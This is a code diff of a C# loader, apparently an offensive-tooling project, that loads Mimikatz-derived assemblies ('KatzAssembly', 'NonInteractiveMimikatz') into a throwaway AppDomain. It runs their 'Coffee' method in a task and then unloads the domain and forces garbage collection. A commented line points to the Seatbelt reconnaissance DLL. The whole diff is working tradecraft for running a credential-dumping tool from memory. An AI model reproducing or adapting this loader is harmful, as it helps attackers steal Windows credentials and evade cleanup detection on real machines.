@@ -11,18 +11,16 @@ namespace NewApproach
 {
     class NewApproach
     {
-
-
-        static void Main(string[] args)
+        public static void InteractiveMiMi()
         {
             AppDomain ad = AppDomain.CreateDomain("Test");
             Console.WriteLine("new AppDomain \"Test\" was created");
-            byte[] mimi = loadFile(@"..\..\..\KatzAssembly\bin\Debug\KatzAssembly.dll");
+            //byte[] mimi = loadFile(@"..\..\..\KatzAssembly\bin\Debug\KatzAssembly.dll");
 
             // Loader lives in another AppDomain
             Loader loader = (Loader)ad.CreateInstanceAndUnwrap(
                 typeof(Loader).Assembly.FullName,
-                typeof(Loader).FullName);           
+                typeof(Loader).FullName);
 
             //loader.LoadAssembly(@"E:\Users\RODCHENKO\Documents\GitHub\Seatbelt\Seatbelt\bin\Debug\Seatbelt.dll");
             loader.LoadAssembly(loadFile(@"..\..\..\KatzAssembly\bin\Debug\KatzAssembly.dll"));
@@ -38,11 +36,48 @@ namespace NewApproach
             Console.WriteLine("Press enter to clear Appdomain");
             Console.ReadLine();
             AppDomain.Unload(ad);
-            ad = null;            
+            ad = null;
             GC.Collect();
             GC.WaitForFullGCComplete();
             Console.WriteLine("Appdomain cleared");
             Console.ReadLine();
+        }
+
+        public static void NonInteractiveMiMi()
+        {
+            AppDomain ad = AppDomain.CreateDomain("Test");
+            Console.WriteLine("new AppDomain \"Test\" was created");
+            byte[] mimi = loadFile(@"..\..\..\NonInteractiveMimikatz\bin\Debug\NonInteractiveMimikatz.dll");
+
+            // Loader lives in another AppDomain
+            Loader loader = (Loader)ad.CreateInstanceAndUnwrap(
+                typeof(Loader).Assembly.FullName,
+                typeof(Loader).FullName);
+
+            loader.LoadAssembly(mimi);
+            Console.WriteLine("Assembly was loaded into new \"Test\" AppDomain");
+            //loader.ExecuteStaticMethod("Seatbelt.Program","ListUserFolders");
+
+            var t = Task.Run(() => {
+                loader.ExecuteStaticMethod("NonInteractiveKatz.NonInteractiveKatz", "Coffee");
+            });
+
+            t.Wait();
+            t.Dispose();
+            Console.WriteLine("Press enter to clear Appdomain");
+            Console.ReadLine();
+            AppDomain.Unload(ad);
+            ad = null;
+            GC.Collect();
+            GC.WaitForFullGCComplete();
+            Console.WriteLine("Appdomain cleared");
+            Console.ReadLine();
+        }
+
+        static void Main(string[] args)
+        {
+            NonInteractiveMiMi();
+            //InteractiveMiMi();
         }
 
         static byte[] loadFile(string filename)
